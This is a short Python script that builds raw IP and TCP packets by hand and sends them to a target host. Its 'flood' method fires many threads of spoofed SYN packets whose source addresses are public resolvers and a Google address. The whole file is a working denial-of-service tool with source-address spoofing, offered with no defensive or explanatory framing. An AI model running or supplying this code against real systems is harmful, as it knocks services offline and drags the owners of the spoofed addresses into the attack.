import socket, struct, random, time
from threading import Thread

class RawPacketCrafter:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff); s = ~s & 0xffff
        return s

    def send_packet(self, source_ip):
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(self.target_ip))
        tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), self.target_port, random.randint(0,4294967295), 0, (5 << 4), 0x02, 5840, 0, 0)
        self.sock.sendto(ip_header + tcp_header, (self.target_ip, 0))

    def flood(self, count=100):
        ips = ["8.8.8.8", "1.1.1.1", "142.250.185.174"]
        for i in range(count):
            Thread(target=self.send_packet, args=(random.choice(ips),)).start()
            if i % 10 == 0: print(f"Sent {i} crafted packets", end='\r')
